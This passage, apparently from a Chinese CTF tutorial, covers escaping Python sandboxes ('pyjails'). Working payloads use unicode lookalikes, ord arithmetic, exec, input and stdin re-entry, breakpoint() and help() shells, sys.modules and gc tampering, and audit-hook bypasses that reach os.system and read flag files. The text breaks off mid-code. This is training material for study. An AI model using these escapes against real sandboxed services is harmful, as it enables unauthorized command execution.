<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br><span class="line"></span><br><span class="line">函数名比较好绕过，直接使用 unicode。数字也可以使用 <span class="built_in">ord</span> 来获取然后进行相减。我这里选择的是 <span class="built_in">chr</span>(<span class="number">333</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ğ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Õ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure>
<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;。</p>
<p>这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 a(‘ō’) 进行替换。这样就可以构造一个满足条件的 payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;</span>) </span><br></pre></td></tr></table></figure>
<blockquote>
<p>但其 实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
</blockquote>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<p>打开 input 输入</p>
<p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>]) </span><br></pre></td></tr></table></figure>
<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵()) </span><br></pre></td></tr></table></figure>
<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>下面是一些<code>打开输入流</code>的方式:</p>
<h4 id="sys-stdin-read">sys.stdin.read()</h4>
<p>注意输入完毕之后按 ctrl+d 结束输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;<span class="number">1</span></span><br><span class="line">&gt;<span class="number">2</span></span><br><span class="line">&gt;<span class="number">3</span></span><br><span class="line">&gt;<span class="number">4</span></span><br><span class="line">&gt;<span class="number">5</span></span><br><span class="line">&gt;sys.stdin.readline()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.stdin.readlines()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>在python <span class="number">2</span>中，<span class="built_in">input</span> 函数从标准输入接收输入之后会自动 <span class="built_in">eval</span> 求值。因此无需在前面加上 <span class="built_in">eval</span>。但 raw_input 不会自动 <span class="built_in">eval</span>。</span><br></pre></td></tr></table></figure>
<h4 id="breakpoint-函数">breakpoint 函数</h4>
<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="help-函数">help 函数</h4>
<p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助（不编码也能打开）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">𝘩𝘦𝘭𝘱() </span><br><span class="line"></span><br><span class="line">然后输入 os,此时会进入 os 的帮助文档。</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>&gt; os </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再输入 !sh 就可以拿到 /<span class="built_in">bin</span>/sh, 输入 !bash 则可以拿到 /<span class="built_in">bin</span>/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="字符串叠加">字符串叠加</h4>
<p>参考[CISCN 2023 初赛]pyshell，通过_不断的进行字符串的叠加，再利用eval()进行一些命令的执行。</p>
<p>我们想执行的代码：<strong>import</strong>(“os”).popen(“tac flag”).read()</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;__import__&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;(&quot;os&quot;).p&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;open(&quot;ta&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;c flag&quot;)&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;.read()&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="变量覆盖与函数篡改">变量覆盖与函数篡改</h4>
<p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 sys.modules[‘<strong>main</strong>’] 就可以访问当前模块定义的所有函数以及全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aaa = <span class="string">&#x27;bbb&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     dict_global = <span class="built_in">dict</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">break</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">continue</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">continue</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">continue</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>... </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;my_input&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>].aaa</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;bbb&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 __builtins__篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h4 id="利用-gc-获取已删除模块">利用 gc 获取已删除模块</h4>
<p>这个思路来源于 writeup by fab1ano – github</p>
<p>这道题的目标是覆盖 <strong>main</strong> 中的 <strong>exit 函数,但是题目将 sys.modules['__main</strong>’] 删除了,无法直接获取.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure>
<p>gc 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。gc 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。gc 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 gc 模块中的主要函数：</p>
<ol>
<li>
<p>gc.collect(generation=2)：这个函数会立即触发一次垃圾回收。你可以通过 generation 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</p>
</li>
<li>
<p>gc.get_objects()：这个函数会返回当前被管理的所有对象的列表。</p>
</li>
<li>
<p>gc.get_referrers(*objs)：这个函数会返回指向 objs 中任何一个对象的对象列表。</p>
</li>
</ol>
<p>exp 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">in</span> obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module __main__&#x27;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> == obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module os&#x27;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&quot;[+] bypass&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<p>利用 traceback 获取模块</p>
<p>这个思路来源于 writeup by hstocks – github</p>
<p>主动抛出异常, 并获取其后要执行的代码, 然后将__exit__ 进行替换, 思路也是十分巧妙.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"><span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line"><span class="comment"># has a reference to the audit function</span></span><br><span class="line"><span class="keyword">while</span> nxt_frame:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line"><span class="comment"># Neuter the __exit function</span></span><br><span class="line">nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是实际测试时使用 python 3.11 发现 nxt_frame = tb.tb_frame 会触发 object.<strong>getattr</strong> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 <code>python 3.9 (题目版本)</code>中适用</p>
<h4 id="绕过-audit-hook">绕过 audit hook</h4>
<p>Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li>import：发生在导入模块时。</li>
<li>open：发生在打开文件时。</li>
<li>write：发生在写入文件时。</li>
<li>exec：发生在执行Python代码时。</li>
<li>compile：发生在编译Python代码时。</li>
<li></li>
<li>ocket：发生在创建或使用网络套接字时。</li>
<li>os.system，os.popen等：发生在执行操作系统命令时。</li>
<li>subprocess.Popen，subprocess.run等：发生在启动子进程时。</li>
<li>PEP 578 – Python Runtime Audit Hooks</li>
</ul>
<p>calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱,采用白名单来进行限制.audit hook 属于 python 底层的实现,因此常规的变换根本无法绕过.</p>
<p>题目源码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line">    dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">      <span class="keyword">except</span> EOFError:</span><br><span class="line">          <span class="built_in">print</span>()</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_                _                           _       _ _   _                _   __</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | / /</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &#x27;_ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  dict_global = dict()</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">      except EOFError:</span></span><br><span class="line"><span class="string">          print()</span></span><br><span class="line"><span class="string">          break</span></span><br><span class="line"><span class="string">      except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">          print(&#x27;bye~~&#x27;)</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      if input_data == &#x27;&#x27;:</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)</span></span><br><span class="line"><span class="string">      except SyntaxError as err:</span></span><br><span class="line"><span class="string">          print(err)</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          exec(complie_code, dict_global)</span></span><br><span class="line"><span class="string">      except Exception as err:</span></span><br><span class="line"><span class="string">          print(err)</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;White list of audit hook ===&gt; builtins.input,builtins.input/result,exec,compile&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Some code of python jail:&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(CODE)</span><br><span class="line">  my_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  sys.addaudithook(my_audit_hook)</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
<p>这道题需要绕过的点有两个:</p>
<p>绕过 import 导入模块. 如果直接使用 import,就会触发 audithook</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"> Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line"></span><br><span class="line">绕过常规的命令执行方法执行命令. 利用 os, subproccess 等模块执行命令时也会触发 audithook</span><br></pre></td></tr></table></figure>
<p>调试技巧</p>
<p>本地调试时可以在 hook 函数中添加打印出 hook 的类型.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] <span class="subst">&#123;my_event&#125;</span>, <span class="subst">&#123;_&#125;</span>&#x27;</span>)</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br></pre></td></tr></table></figure>
<p>这样在测试 payload 时就可以知道触发了哪些 hook</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">[+] builtins.<span class="built_in">input</span>/result, (<span class="string">&#x27;import os&#x27;</span>,)</span><br><span class="line">[+] <span class="built_in">compile</span>, (<span class="string">b&#x27;import os&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>)</span><br><span class="line">[+] <span class="built_in">exec</span>, (&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x7f966795bec0</span>, file <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>&gt;,)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">__loader__.load_module 导入模块</span><br><span class="line"></span><br><span class="line">__loader__.load_module(fullname) 也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.</span><br><span class="line"></span><br><span class="line"> __loader__.load_module(<span class="string">&#x27;os&#x27;</span>) </span><br><span class="line"></span><br><span class="line">__loader__ 实际上指向的是 _frozen_importlib.BuiltinImporter 类,也可以通过别的方式进行获取</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span 